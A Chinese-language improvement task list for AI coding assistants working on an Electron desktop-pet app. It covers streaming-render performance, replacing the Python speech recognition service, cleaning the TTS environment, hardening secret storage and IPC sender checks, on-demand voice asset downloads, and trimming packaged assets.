# FPNF v1.7 改进任务清单

> 本文件是给 AI 编码助手（Codex / Claude / Copilot 等）的可执行任务说明。
> 基于对 `src/` 全部 154 个 TypeScript 文件、打包配置与 `release/` 实际发布产物的完整审查。
> 仓库根目录：`C:\ai_deskpet`

---

## 0. 执行前必读

### 0.1 先读这两份文件

1. `AGENTS.md` —— 仓库强制规则，10 条，全部适用
2. `docs/SECURITY_CODING_STANDARD.md` —— 安全编码标准

本清单的所有任务都**不得**与上述两份文件冲突。若发现冲突，停下来说明冲突点，不要自行取舍。

### 0.2 全局约束（硬性，每个任务都适用）

| # | 约束 | 原因 |
|---|---|---|
| G1 | **不得改动任何 ONNX 模型权重文件** | 已按"音质优先"排除量化方案。三个模型（BERT 408 MB / TTS 249 MB / ASR 239 MB）原样保留 |
| G2 | **保持 zip 免安装分发** | 不引入 NSIS / Inno / MSI / 代码签名。未签名 exe 会触发 SmartScreen，比 zip 更劝退 |
| G3 | **不得削弱 Electron 信任边界** | `contextIsolation` / `sandbox` / `nodeIntegration:false` / preload 白名单，一律不动 |
| G4 | **不得新增远程代码执行、任意文件访问、屏幕观察、桌面控制能力** | AGENTS.md 第 6 条 |
| G5 | **可选子系统失败必须安全降级**，不得阻塞纯文字聊天与本地角色显示 | AGENTS.md 第 7 条 |
| G6 | **一次只做一个任务**，单独提交 | 便于回滚与审查 |
| G7 | 完成后跑最小相关测试；跨边界改动跑 `pnpm verify` | AGENTS.md 第 9 条 |
| G8 | **不得提交、推送、发布、打包、改写历史或修改仓库可见性** | AGENTS.md 第 10 条 |

### 0.3 任务索引

| 编号 | 标题 | 优先级 | 预估 | 风险 |
|---|---|---|---|---|
| T1 | 修复流式回复时的全量 DOM 重建 | P0 | 半天 | 低 |
| T2 | ASR 侧整个去掉 Python，改用 sherpa-onnx-node | P0 | 1–2 天 | 中 |
| T3 | 用锁文件重建干净的 TTS Python 环境 | P0 | 1 天 | 低 |
| T4 | SecretStore 加写串行化 + 坏条目跳过 | P1 | 半天 | 低 |
| T5 | IPC sender 守卫机制化 + 注册函数改对象参数 | P1 | 半天 | 低 |
| T6 | 语音资产改为应用内分档按需下载 | P1 | 2–3 天 | 中 |
| T7 | 按面板拆分 chat-controller.ts | P1 | 持续 | 中 |
| T8 | 清理 assets 与打包白名单 | P2 | 半天 | 低 |
| T9 | 补齐 CSP，移除生产包里的 dev server 地址 | P2 | 1 小时 | 低 |
| T10 | 数据库裁剪节流 + busy_timeout | P2 | 1 小时 | 低 |
| T11 | 项目检查审批弹窗展示脚本原文 | P2 | 1 小时 | 低 |
| T12 | 修正 create-main-window 的声明顺序 | P3 | 10 分钟 | 极低 |
| T13 | 给降级路径的静默 catch 接上诊断日志 | P3 | 半天 | 低 |
| T14 | 探测 node:sqlite 的 backup 可用性 | P3 | 1 小时 | 低 |

**建议顺序**：T1 → T2 → T3 → T4 → T5 → T6，其余按需。

---

## T1 · 修复流式回复时的全量 DOM 重建

**优先级** P0 · **预估** 半天 · **风险** 低
**影响文件** `src/renderer/chat/chat-controller.ts`

### 现状

`chat-controller.ts:3518` 附近，`text-delta` 事件处理是：

```ts
if (event.type === 'text-delta') {
  activeReply += event.text;
  activeSpeechTurn?.appendText(event.text);
  renderConversationTimeline();          // ← 问题在这
  setReplyStatus('正在回复…');
  void getPresentation()?.setState('talking');
  return;
}
```

而 `renderConversationTimeline()`（约 3039 行）第一行就是：

```ts
conversationList.replaceChildren();
```

然后循环重建**全部**消息节点（历史上限 100 条），最后写一次
`conversationList.scrollTop = conversationList.scrollHeight`。

### 问题

一条 500 token 的回复 × 100 条历史 = 约 5 万次 DOM 元素创建，外加 500 次
`scrollTop` 赋值触发的强制同步布局（reflow）。这些发生在一个透明置顶、
同时跑 pixi.js Live2D 渲染的窗口里，直接表现为"桌宠说话时卡顿"。

`renderHistory()`（3076 行）内部也调用了 `renderConversationTimeline()`，
同样重建 `historyList`，但它只在会话开始/结束时调用，不在本任务范围内。

### 改法

**1. 把"活跃回复"节点提取为独立的可复用节点**

在 `initializeChat` 的状态区（`let activeReply = '';` 附近，约 2252 行）新增：

```ts
let activeReplyNode: HTMLElement | undefined;
let activeReplyTextNode: HTMLParagraphElement | undefined;
let pendingScrollFrame: number | undefined;
```

**2. 新增只更新活跃节点的轻量函数**

```ts
const ensureActiveReplyNode = (): HTMLParagraphElement => {
  if (activeReplyTextNode) return activeReplyTextNode;
  const item = document.createElement('article');
  item.className = 'conversation-message conversation-message--assistant';
  const content = document.createElement('p');
  item.append(content);
  conversationList.append(item);
  activeReplyNode = item;
  activeReplyTextNode = content;
  return content;
};

const clearActiveReplyNode = (): void => {
  activeReplyNode?.remove();
  activeReplyNode = undefined;
  activeReplyTextNode = undefined;
};

// 仅在贴近底部时自动滚动，且每帧最多一次
const scheduleScrollToBottom = (): void => {
  if (pendingScrollFrame !== undefined) return;
  const nearBottom =
    conversationList.scrollHeight -
      conversationList.scrollTop -
      conversationList.clientHeight <
    48;
  if (!nearBottom) return;
  pendingScrollFrame = window.requestAnimationFrame(() => {
    pendingScrollFrame = undefined;
    conversationList.scrollTop = conversationList.scrollHeight;
  });
};

const appendActiveReplyDelta = (): void => {
  ensureActiveReplyNode().textContent = activeReply;
  scheduleScrollToBottom();
};
```

**3. 把 text-delta 分支改成**

```ts
if (event.type === 'text-delta') {
  activeReply += event.text;
  activeSpeechTurn?.appendText(event.text);
  appendActiveReplyDelta();              // ← 只改一个文本节点
  setReplyStatus('正在回复…');
  void getPresentation()?.setState('talking');
  return;
}
```

**4. 让 `renderConversationTimeline()` 与新节点协同**

`renderConversationTimeline()` 内部 `replaceChildren()` 会连活跃节点一起清掉，
所以它必须在开头调用 `clearActiveReplyNode()` 重置引用，避免持有已脱离文档的节点。
它现有的"把 activeReply 作为临时消息拼进列表"的逻辑保持不变——
这样在流式结束、消息落库、切换角色等场景下渲染结果与现在完全一致。

同样地，`scheduleScrollToBottom` 里的 `pendingScrollFrame` 必须在
`initializeChat` 返回的 dispose 函数中 `cancelAnimationFrame` 掉。

**5. 所有把 `activeReply` 置空的地方（2836、2840、3548、3580、5665、5716 行附近）
都要同时调用 `clearActiveReplyNode()`**，或者更稳妥的做法是让这些位置统一走一个
`resetActiveReply()` 辅助函数。

### 验收标准

- [ ] 流式回复过程中，DevTools Performance 面板里 `conversationList` 的子节点数保持稳定，不再每帧全量重建
- [ ] 用户在回复过程中向上滚动查看历史时，**不再被强制拽回底部**
- [ ] 回复结束后，消息落库并重新渲染的结果与改动前逐字一致
- [ ] 取消回复（stop）、切换角色、清空历史后不残留孤立的活跃回复节点
- [ ] 新增单元测试覆盖：连续 3 次 delta 后 DOM 中只有 1 个 assistant 节点且文本正确
- [ ] `pnpm test` 通过

### 不要做

- 不要引入虚拟滚动、diff 库或任何前端框架
- 不要改变消息的 DOM 结构和 class 名（`renderer/styles.css` 依赖它们）
- 不要顺手重构 `renderHistory()`，那是 T7 的范围

---

## T2 · ASR 侧整个去掉 Python，改用 sherpa-onnx-node

**优先级** P0 · **预估** 1–2 天 · **风险** 中
**影响文件** `src/main/speech/speech-service.ts`、`src/main/speech/bundled-speech-runtime.ts`、
`src/adapters/speech/`（新增）、`src/main/index.ts`、`package.json`、`resources/speech-input-runtime/`

### 现状

当前 ASR 调用链有五层：

```
Electron main
  → HTTP 127.0.0.1:9880
    → uvicorn / FastAPI
      → Python (sensevoice_asr_service.py)
        → sherpa_onnx（本身就是 C++）
```

- `BundledSpeechInputRuntime`（`bundled-speech-runtime.ts` 约 230 行起）负责拉起 Python 进程
- `SpeechService.transcribe()`（`speech-service.ts:419`）通过
  `OpenAICompatibleTranscriptionAdapter` 打 HTTP 到 `settings.transcriptionBaseUrl`
- 内置模式下 `transcriptionBaseUrl` 指向 `http://127.0.0.1:9880`
- 运行时资产：`speech-input-runtime/python/`（嵌入式 CPython + numpy + fastapi +
  uvicorn + pydantic + starlette + sherpa_onnx）约 80 MB，以及
  `models/sensevoice/model.int8.onnx` 239 MB

### 目标

塌缩成两层，**模型文件完全不动**：

```
Electron main
  → sherpa-onnx-node（同一个 C++ 库，直接进程内调用）
```

### 收益

- 体积约 **60–80 MB**（整个嵌入式 CPython 与 Python 依赖）
- 少一个常驻进程
- 每次转写省掉一次 HTTP 往返与一次 WAV 编解码
- 冷启动：现在 `STARTUP_READY_ATTEMPTS = 240 × 250 ms` 意味着最长要等 **60 秒**
  才判定语音输入不可用；改后是加载模型的时间

### 改法

**第 0 步：先验证可行性，再动代码**

在一个临时脚本里确认以下三件事，**任何一条不成立就停下来汇报，不要硬改**：

1. `sherpa-onnx-node` 在 **Windows x64** 上能安装并加载（官方 README 的平台列表以 macOS/Linux 为主，Windows 需实测）
2. 它能加载现有的 `models/sensevoice/model.int8.onnx` + `tokens.txt`，
   转写结果与现在的 Python 服务**一致**（用同一段音频对比）
3. 在 **Electron 43 的 Node ABI** 下能加载（原生 addon 需要匹配 ABI）

**第 1 步：新增本地 ASR 适配器**

新建 `src/adapters/speech/local-sherpa-asr.ts`，与现有适配器保持相同风格：
构造函数注入依赖、方法接受 `AbortSignal`、失败抛出带中文消息的 Error。

接口要与 `OpenAICompatibleTranscriptionAdapter` 的 `transcribe()` 对齐，
以便 `SpeechService` 能按 provider 选择其一。

要点：
- 识别器实例**惰性创建并复用**，不要每次转写都重新加载 239 MB 模型
- 提供 `dispose()` 释放识别器；由 `SpeechService.dispose()` 调用
- 模型路径解析沿用 `bundled-speech-runtime.ts` 里 `isWithin()` + `realpath()` + `lstat()`
  的那套完整性与符号链接校验，**不要降低这里的安全强度**
- 音频输入格式：现在渲染层已在
  `chat-controller.ts:195 convertRecordingToTranscriptionWav()` 里转成 16 kHz 单声道 PCM WAV，
  addon 需要的是 Float32 采样数组，做一次 WAV 头解析即可，**不要引入音频解码库**

**第 2 步：接进 SpeechService**

- 在构造函数中新增可选参数 `localTranscriptionAdapter`（放在参数列表末尾，
  与现有可选参数风格一致）
- `transcribe()` 中：当设置为"使用内置本地识别"时走新适配器，
  否则维持现有的 OpenAI 兼容 HTTP 路径（**远程 ASR 能力必须保留**）
- `getStatus()` 中内置识别的可用性判断，从"探测 9880 端口"改为"模型文件校验通过且 addon 可加载"

**第 3 步：删除 Python ASR 运行时**

- 删除 `bundled-speech-runtime.ts` 中的 `BundledSpeechInputRuntime` 类、
  `BundledSpeechInputRuntimeCandidate` 接口、`resolveBundledSpeechInputRuntimeCandidate()`
  以及 `INPUT_READY_URL`、`INPUT_DIAGNOSTIC_LINE_PATTERN` 常量
- `main/index.ts` 中移除 `bundledSpeechInputRuntime` 变量、构造、注入与 `before-quit` 中的 dispose
- `SpeechService` 构造参数中的 `ensureBundledInputRuntime`、`inputReadinessProbe` 一并移除
- 删除 `resources/speech-input-runtime/sensevoice_asr_service.py`
- `package.json` 的 `build.extraResources` 中移除
  `resources/speech-input-runtime/sensevoice_asr_service.py` 条目
- 删除 `src/main/speech/loopback-speech-service-probe.ts`（若确认仅 ASR 在用；
  若 TTS 也在用则保留）
- 同步删除或改写 `tests/bundled-speech-runtime.test.ts` 中 ASR 部分、
  `tests/loopback-speech-service-probe.test.ts`

**第 4 步：打包配置**

原生 addon 不能打进 asar，参照现有 `uiohook-napi` 的处理：

```jsonc
"asarUnpack": [
  "node_modules/uiohook-napi/prebuilds/win32-x64/**/*",
  "node_modules/sherpa-onnx-node/**/*",       // 具体路径以实际包结构为准
  "node_modules/sherpa-onnx-win-x64/**/*"     // 平台包，名称需实测确认
]
```

注意 `npmRebuild: false` 当前为关闭状态，若 addon 需要 rebuild 需另行评估。

**第 5 步：模型文件的新位置**

模型不再随 Python 运行时走，需要一个独立的存放约定。
建议 `<语音资产根>/asr/sensevoice/`，并与 T6 的分档下载对齐。
过渡期可先保留现有路径，在 T6 中统一调整。

### 验收标准

- [ ] 中文语音输入端到端可用，识别结果与改动前一致
- [ ] 任务管理器中不再有 ASR 的 `python.exe` 进程
- [ ] 断开网络时语音输入仍可用（本地识别不依赖网络）
- [ ] 模型文件缺失 / 损坏 / 被替换为符号链接时，语音输入安全降级为不可用，
      **且不阻塞文字聊天**（G5）
- [ ] 连续转写 20 次不出现内存持续增长（识别器被复用而非重复加载）
- [ ] 远程 OpenAI 兼容 ASR 路径未被破坏
- [ ] 打包后（`pnpm package:win`）的产物中 addon 能正常加载
- [ ] `pnpm verify` 通过

### 不要做

- 不要顺手把 TTS 也改掉（那是另一件事，见"暂不处理"一节）
- 不要更换 ASR 模型（sherpa-onnx 的 paraformer int8 是 227 MB，
  与现在的 SenseVoice int8 239 MB 同量级，换了没有体积收益）
- 不要为了适配 addon 而放宽 `bundled-speech-runtime.ts` 里的路径校验

---

## T3 · 用锁文件重建干净的 TTS Python 环境

**优先级** P0 · **预估** 1 天 · **风险** 低
**影响文件** `resources/voice-runtime/`、构建/打包脚本

### 现状

`voice-runtime/python/Lib/site-packages/` 是反复 `pip install` 叠加出来的环境，
不是一次性干净构建的。实测证据：

| 现象 | 证据 |
|---|---|
| 重复安装 | `filelock` 有 **3 份** dist-info（3.32.3 / 3.32.4 / 3.32.5）；`setuptools` 3 份；`joblib` / `regex` / `protobuf` 各 2 份 |
| 删包残留 | `torch-2.8.0+cpu.dist-info`、`torchaudio-2.8.0+cpu.dist-info`、`scipy-1.17.1.dist-info`、`numba-0.67.0.dist-info`、`librosa-0.11.0.dist-info`、`scikit_learn-1.9.0.dist-info`、`umap_learn-0.5.12.dist-info` 等 **dist-info 存在但包体已被手工删除** |
| 两份推理引擎 | 同时存在 `onnxruntime-1.29.0.dist-info` 与 `onnxruntime_directml-1.23.0.dist-info` |
| 完全无关的包 | `aliyunsdkkms`、`oss2`、`aliyun_python_sdk_*`（阿里云 SDK）、`modelscope`、`tensorboardX`、`tiktoken`、`huggingface_hub`、`hydra`、`pooch`、`pydevd_plugins`（调试器插件） |
| 构建残留 | 顶层 `build/`、`src/`、`share/`、`licensing/` 目录；两个 **0 字节**的 `.whl` 文件（`numpy-1.26.4-...whl`、`scipy-1.17.1-...whl`）；`__pycache__` |

**dist-info 空壳的危害**：`importlib.metadata` 会认为 torch 已安装，
将来排障时会产生极具误导性的现象。

### 实际需要的依赖

`resources/voice-runtime/ireina_tts_service.py` 的顶层 import 只有：

```python
import numpy as np
import onnxruntime
from fastapi import FastAPI, HTTPException
from fastapi.responses import Response
from pydantic import BaseModel, Field
from style_bert_vits2.tts_model import TTSModel
from style_bert_vits2.constants import Languages
from style_bert_vits2.nlp import onnx_bert_models
```

加上 `style_bert_vits2` 自身在 **ONNX 推理路径**下的依赖
（`pyopenjtalk`、`sentencepiece`、`soundfile`、`jaconv`、`num2words`、`cn2an` 等）
以及 `uvicorn`。

**整个 torch 生态一行都不需要** —— 服务里 `TTSModel(..., device="cpu", onnx_providers=providers)`
走的是纯 ONNX 路径，BERT 也是 `onnx_bert_models`。

### 改法

**关键原则：从零重建，不要在现有环境上继续删。**

1. 新建 `resources/voice-runtime/requirements.txt`，只列直接依赖
2. 用干净的 Python 3.12 embeddable 包 + `pip install -r requirements.txt --target ...`
   构建一个全新环境
3. 用 `pip freeze` 产出 `requirements.lock`，纳入版本控制
4. 卸载 `onnxruntime`（纯 CPU 版）—— **`onnxruntime-directml` 已自带 CPU provider**，
   服务里的 provider 列表 `["DmlExecutionProvider", "CPUExecutionProvider"]` 仍然成立
5. 构建后清理：`__pycache__`、`*.whl`、`*.pyi`、`tests/`、`*.dist-info/RECORD` 之外的非必要文件
6. 写一个可重复执行的构建脚本（放 `scripts/`），让这个环境将来可以一键重建
7. **重建后必须跑一次完整的 TTS 冒烟测试**，确认没有漏装间接依赖

### 验收标准

- [ ] `site-packages` 中没有任何重复的 dist-info
- [ ] 没有任何"有 dist-info 但没有包体"的条目
- [ ] 没有 `aliyunsdkkms` / `oss2` / `modelscope` / `tensorboardX` / `tiktoken` / `pydevd_plugins`
- [ ] 没有顶层 `build/` / `src/` 目录，没有 0 字节 `.whl`
- [ ] 只有一份 onnxruntime（directml 版）
- [ ] TTS 端到端可用，**生成的音频与重建前逐字节一致或听感无差异**
- [ ] DirectML 与 CPU 两条 provider 路径都验证过（可临时改 `force_cpu_only` 触发）
- [ ] `requirements.lock` 已提交，构建脚本可重复执行
- [ ] 记录重建前后的目录体积对比

### 不要做

- 不要升级 `style_bert_vits2` 的大版本（可能改变音色）
- 不要动 `voice/ireina/` 下的任何模型文件（G1）
- 不要为了省体积而删掉 `LICENSE.Style-Bert-VITS2-*.txt`（AGPL/LGPL 要求保留）

---

## T4 · SecretStore 加写串行化 + 坏条目跳过

**优先级** P1 · **预估** 半天 · **风险** 低
**影响文件** `src/main/security/secret-store.ts`、`tests/`

### 问题 A：并发写会丢密钥

`set()`（第 85 行）的流程是 `read()` → 改内存对象 → `write()` 整个文件。
两个 `set()` 并发时，后写的会覆盖先写的，**先写进去的密钥直接消失**。

触发场景：设置页里同时填了 LLM key 和 TTS key 然后一起保存。

更隐蔽的是 `get()`（第 79 行）在 `shouldReEncrypt` 分支会**回头调用 `set()`**，
也就是一次读取也可能引发一次并发写。

### 问题 B：一条损坏，全部失效

`parseSecretFile()`（第 36 行）只要遇到**任意一条**记录的 id 不匹配
`SECRET_ID_PATTERN` 或密文不是合法 base64，就直接 `throw`，整个 store 变成不可读。
用户表现是"所有 API key 一起消失"，且没有任何提示说明原因。

### 改法

**A. 加 promise 链互斥**

```ts
export class SecretStore {
  private queue: Promise<unknown> = Promise.resolve();

  private serialize<T>(task: () => Promise<T>): Promise<T> {
    const next = this.queue.then(task, task);
    this.queue = next.catch(() => undefined);
    return next;
  }
  // ...
}
```

`set()`、`delete()`，以及 `get()` 中的 re-encrypt 分支，全部包进 `serialize()`。
注意 `get()` 的读取本身不必串行，只有它触发的写需要。

**B. 跳过坏条目而非整体拒绝**

`parseSecretFile()` 改为：遇到不合法条目时 `continue`，并通过回调把
被跳过的 **id**（**绝不记录密文**）报给 `SafeDiagnosticLog`，其余密钥正常返回。
只有当文件整体不是合法 JSON、或 `version` 字段不为 1 时才 throw。

**C. 写入加 fsync**

`write()`（第 137 行）目前是 `writeFile` + `rename`。
`rename` 是原子的，但数据可能还在页缓存里。改为用 `open()` 拿到文件句柄，
`writeFile` 后调 `fh.sync()` 再 `close()`，然后 `rename`。

### 验收标准

- [ ] 新增测试：并发发起 5 个不同 id 的 `set()`，全部成功且 5 个密钥都能读回
- [ ] 新增测试：并发 `set()` 与 `delete()` 交错，结果与串行执行等价
- [ ] 新增测试：secrets 文件中混入一条 id 非法的记录，其余密钥仍可正常读取
- [ ] 新增测试：secrets 文件不是合法 JSON 时抛错（这个行为保持不变）
- [ ] 诊断日志中出现被跳过的 id，**不出现任何密文片段**
- [ ] `pnpm test` 通过

### 不要做

- 不要引入外部锁库
- 不要改变加密方式或 `safeStorage` 的使用
- 不要在任何日志、错误消息中输出密文或明文密钥（AGENTS.md 第 3 条）

---

## T5 · IPC sender 守卫机制化 + 注册函数改对象参数

**优先级** P1 · **预估** 半天 · **风险** 低
**影响文件** `src/main/ipc/register-ipc-handlers.ts`、`src/main/index.ts`、`tests/ipc-sender.test.ts`

### 现状（先说好的）

已核对：`register-ipc-handlers.ts` 中 **85 个 `ipcMain.handle` 全部调用了
`requireTrustedSender`，一个没漏**。这是很扎实的工作，本任务不是在修漏洞。

### 问题

它靠的是"每次都记得写这一行"这条人工纪律。将来任何一个新 handler 忘了写，
就是一个静默的权限绕过，**而且没有任何测试会发现**。

另外 `registerIpcHandlers`（第 167 行）有 **19 个位置参数**，
其中 12 个是可选的同类型服务对象（都是 `Xxx | undefined`）。
调用方 `main/index.ts` 传了一长串裸变量，相邻两个传反了 TypeScript 也不一定报错。

### 改法

**A. 把守卫做进注册封装，让"不安全"写不出来**

```ts
const handle = <T>(
  channel: string,
  handler: (input: unknown, event: IpcMainInvokeEvent) => T | Promise<T>,
): void =>
  ipcMain.handle(channel, (event, input: unknown) => {
    requireTrustedSender(event, windows);
    return handler(input, event);
  });
```

然后把 85 个 handler 全部改写为 `handle(...)`。这是机械替换：

```ts
// 改前
ipcMain.handle(IPC_CHANNELS.getAppVersion, (event) => {
  requireTrustedSender(event, windows);
  return app.getVersion();
});

// 改后
handle(IPC_CHANNELS.getAppVersion, () => app.getVersion());
```

**唯一的例外**是 `getGlobalTrackingPoint`（第 245 行附近），
它当前的行为是"未授权时返回 `undefined`"而不是抛错。
保留这个差异，为它单独写一个 `handleSilent` 或维持原样并加注释说明为什么不同。

**B. 注册函数改对象参数**

```ts
export interface IpcHandlerDependencies {
  windows: IpcWindowController;
  models: ModelRuntime;
  conversations: ConversationRuntime;
  profiles: CharacterProfileStore;
  memories: MemoryService;
  characterResearch: CharacterResearchService;
  workGlossary: WorkGlossaryService;
  desktopIntegrations?: DesktopIntegrationService;
  // ... 其余可选依赖
}

export const registerIpcHandlers = (deps: IpcHandlerDependencies): void => { ... };
```

同步更新 `main/index.ts` 的调用点。

**C. 补一个全量越权测试**

扩展 `tests/ipc-sender.test.ts`：遍历 `IPC_CHANNELS` 的每一个 channel，
用一个伪造的非法 sender 调用，断言全部被拒绝。
这样将来漏写守卫会**立刻被测试抓住**。

### 验收标准

- [ ] `register-ipc-handlers.ts` 中不再出现裸的 `ipcMain.handle`
      （可用 ESLint 规则或测试断言强制）
- [ ] 新测试遍历全部 channel，非法 sender 一律被拒
- [ ] `main/index.ts` 的调用点改为对象字面量，字段名清晰
- [ ] `pnpm verify` 通过

### 可选后续（不在本任务内）

该文件 1066 行，可按域拆成 `ipc/model-handlers.ts`、`ipc/speech-handlers.ts`、
`ipc/vtube-handlers.ts` 等。**本任务先不做**，避免一次改动过大。

---

## T6 · 语音资产改为应用内分档按需下载

**优先级** P1 · **预估** 2–3 天 · **风险** 中
**影响文件** `src/main/speech/`、新增下载服务、`src/renderer/chat/`（UI）、`package.json`

### 目标

主包保持 zip 免安装（G2），体积约 145 MB；语音资产按功能分三档，
在应用内下载到 `userData/` 下，而不是随包分发。

### 分档（体积为压缩后估算，模型原样未量化）

| 档位 | 内容 | 体积 | 何时下载 |
|---|---|---|---|
| 第一档 · 桌宠能说话 | TTS Python 运行时 + TTS 声学模型 | ~240 MB | **首次启动静默预下** |
| 第二档 · 语调自然 | 日语 BERT（fp16） | ~250 MB | 排在第一档之后，或用户开启"高质量语音"时 |
| 第三档 · 我能对它说话 | SenseVoice 模型 + sherpa-onnx 原生库 | ~225 MB | 用户第一次点麦克风时 |

第二档可缺失：Style-Bert-VITS2 在没有 BERT 时会退化到较平的语调但仍能出声。
**这一点需要先实测确认**，如果实际会直接报错，则第二档必须并入第一档。

### 架构提示：已有的结构不用改

`bundled-speech-runtime.ts` 的 `resolveBundledSpeechRuntimeSources()` 已经是
"多候选路径依次探测"的形式：

```ts
export const resolveBundledSpeechRuntimeSources = ({ appPath, resourcesPath, packaged }) => {
  const packagedRuntime = path.join(resourcesPath, 'voice-runtime');
  if (packaged) return [packagedRuntime];
  return [packagedRuntime, { runtimeRoot: ..., serviceRoot: ... }];
};
```

**只要在候选列表里加一条 `path.join(userDataPath, 'speech-assets', 'voice-runtime')`
就够了**，完整性校验逻辑（`realpath` + `lstat` + `isWithin` + 必需文件清单）完全复用。

### 下载器要点

**托管**
- 主源：HuggingFace（有 CDN、支持 Range 请求、国内有 `hf-mirror.com` 可作为回退）
- 备源：Cloudflare R2（出口流量免费）
- 兜底：GitHub Release
- 源地址写进一个**可远程更新的 JSON 清单**（版本号 + 每个档位的 SHA256 + 多个 URL），
  这样换源不需要发新版本

**实现**
- **分块并发**：Range 请求切 4–8 段，进度写盘
- **断点续传**：这是最重要的一条。现在浏览器下到 600 MB 断了要从头来，
  这才是用户真正抱怨"慢"的场景
- **边下边解压**：项目已依赖 `fflate`，用它做流式解压直接写进 `userData/`，
  省掉一个几百 MB 的临时文件和一次完整磁盘往返
- **SHA256 校验**：校验通过才启用；失败就删掉重来，不要留半个损坏的运行时
- **后台进行，不阻塞聊天**（G5）：下载期间桌宠照常对话，完成后提示"本地语音已就绪"

**首次启动策略**
- 桌宠正常出现、正常聊天
- 角落一条**不打断的细条**："正在后台准备语音 · 240 MB · 暂停"
- 默认就在下载，用户什么都不做就下完了 —— 但他知道，而且能停
- **这不是一个要点的按钮，也不是一个弹窗**。前者是告知，后者是摩擦
- **检测按流量计费的网络**：可用 `Get-NetConnectionProfile` 或
  `DefaultMediaCost` 注册表项判断；命中就默认暂停，提示改为
  "检测到按流量计费的网络，已暂停 · 仍要下载"。
  复用 `project-check-runner.ts` 里已有的 env 白名单 `execFile` 封装
- **让路**：首次启动同时在初始化 SQLite、加载 Live2D、编译 pixi 着色器。
  把下载放到 `app.whenReady()` 之后再延迟 10–15 秒启动，并限制并发数

### 验收标准

- [ ] 全新安装、无任何语音资产时，文字聊天完全可用
- [ ] 第一档下载完成后 TTS 自动可用，无需重启
- [ ] 断网、中途关闭应用、磁盘写满等情况下，下载能恢复或安全失败，不留损坏资产
- [ ] SHA256 不匹配时资产被删除并给出可读的中文提示
- [ ] 按流量计费的网络下默认不自动下载
- [ ] 下载全程不阻塞对话与 Live2D 渲染
- [ ] 用户可暂停/继续/取消，并能看到剩余体积
- [ ] `resolveBundledSpeechRuntimeSources()` 的原有候选路径仍然有效（开发环境不受影响）
- [ ] `pnpm verify` 通过

### 不要做

- 不要引入安装器（G2）
- 不要把下载源硬编码进代码——必须走可更新的 JSON 清单
- 不要在下载完成前就把语音功能显示为"可用"
- 不要因为要下载而在启动时弹模态对话框

---

## T7 · 按面板拆分 chat-controller.ts

**优先级** P1 · **预估** 持续 · **风险** 中
**影响文件** `src/renderer/chat/`

### 现状

`chat-controller.ts` 共 **5814 行**，顶层只有 15 个符号，其中
`initializeChat()` 一个函数从第 255 行延伸到文件末尾 —— **5560 行**，
内部定义了 **183 个闭包函数**，绑定了 **116 个 `addEventListener`**。
所有状态都是闭包变量，任何一个函数都能修改任何一个状态。

直接后果：`tests/` 有 106 个测试文件，**但没有一个测 chat-controller**，
因为它没有可测的边界。这是整个仓库唯一没有测试保护的大块逻辑，
而它恰好是用户每天接触最多的部分。

### 改法

**不要一次性重写。** 按面板切，每次搬一个，搬完补测试再提交下一个。

建议顺序（从边界最清晰的开始）：

1. `chat/timeline.ts` —— 消息渲染（与 T1 协同，T1 完成后再搬）
2. `chat/composer.ts` —— 输入框、发送、自动增高、拖拽导入
3. `chat/memory-panel.ts` —— 记忆列表与候选
4. `chat/settings-provider.ts` —— 模型提供方设置
5. `chat/settings-speech.ts` —— 语音设置
6. `chat/settings-vtube.ts` —— VTube Studio / ViewerEx 设置
7. `chat/settings-character.ts` —— 角色档案与调研

每个模块导出统一形状：

```ts
export interface PanelDeps { /* 显式声明它需要的 api、store、事件总线 */ }
export const mountXxxPanel = (root: HTMLElement, deps: PanelDeps): (() => void) => {
  // ...
  return () => { /* dispose：解绑监听、清定时器 */ };
};
```

共享状态收进一个显式的 store 对象，不再用闭包变量。

参照 `tests/settings-renderer-wiring.test.ts`（45 KB，已有的渲染层测试写法）
为每个搬出来的模块补测试。

### 验收标准（每个模块单独适用）

- [ ] 搬出的模块有独立的测试文件
- [ ] `mount` 返回的 dispose 能完整解绑该模块所有监听与定时器
- [ ] UI 行为、DOM 结构、class 名与搬动前完全一致（`styles.css` 依赖它们）
- [ ] `chat-controller.ts` 行数相应减少
- [ ] `pnpm verify` 通过

### 不要做

- 不要引入前端框架（React / Vue / Svelte）
- 不要改动 `renderer/styles.css`（44 KB，与 DOM 结构强耦合）
- 不要在一次提交里搬多个面板

---

## T8 · 清理 assets 与打包白名单

**优先级** P2 · **预估** 半天 · **风险** 低
**影响文件** `vite.config.mts`、`package.json`、`assets/models/local/`

### 问题 A：`.cmo3` 源工程文件被分发

`assets/models/local/凯尔希live2d/凯尔希直播版1.cmo3` = **8.09 MB**。

`.cmo3` 是 Live2D Cubism 的**源工程文件**，运行时只需要 `.moc3`，
它对程序毫无用处，而分发它等于分发源资产。**删除。**

### 问题 B：先全量拷贝再黑名单排除

`vite.config.mts` 中 `publicDir: '../../assets'` 会把整个 `assets/` 原样拷进
`dist/renderer/`，然后在 `package.json` 的 `build.files` 里用一串 `!` 规则排除。

两个隐患：
1. 每次构建白拷约 36 MB，拖慢 CI
2. 排除规则里有**中文路径** `!dist/renderer/models/local/凯尔希live2d/**/*`，
   electron-builder 的 glob 在非 ASCII 路径上匹配行为不稳定，
   **一旦失配这 9.7 MB 就悄悄进包了**

改成白名单：只把要发布的模型放进 `public/`，`build.files` 里不再需要那串 `!` 规则。

### 问题 C：Electron 侧可裁剪项

| 文件 | 体积 | 处理 |
|---|---|---|
| `dxcompiler.dll` + `dxil.dll` | 27.1 MB | **可删**。WebGPU 用的，pixi.js 走 WebGL 不需要 |
| `locales/*.pak`（约 50 种语言） | ~10 MB | 用 `electronLanguages: ["zh-CN", "en-US"]` 收窄 |
| `LICENSES.chromium.html` | 20.3 MB | 法务上需保留，可考虑压缩存放 |
| `vk_swiftshader.dll` + `vulkan-1.dll` | 6.4 MB | **建议保留** —— 无 GPU 机器的软渲染兜底，桌宠场景值得留 |
| `d3dcompiler_47.dll` | 4.7 MB | **必须保留**，WebGL 需要 |

### 验收标准

- [ ] `.cmo3` 已从仓库和构建产物中移除
- [ ] `build.files` 中不再有基于中文路径的 `!` 排除规则
- [ ] `dist/renderer/` 中只包含实际要发布的模型
- [ ] 打包产物中没有 `dxcompiler.dll` / `dxil.dll`
- [ ] `locales/` 只剩 zh-CN 与 en-US
- [ ] 应用在有 GPU 与无 GPU（软渲染）两种环境下均能正常显示 Live2D
- [ ] 记录裁剪前后的产物体积对比
- [ ] `tests/kaltsit-model-assets.test.ts`、`tests/package-config.test.ts` 相应更新并通过

### 不要做

- 不要删 `d3dcompiler_47.dll` 或 `libGLESv2.dll`
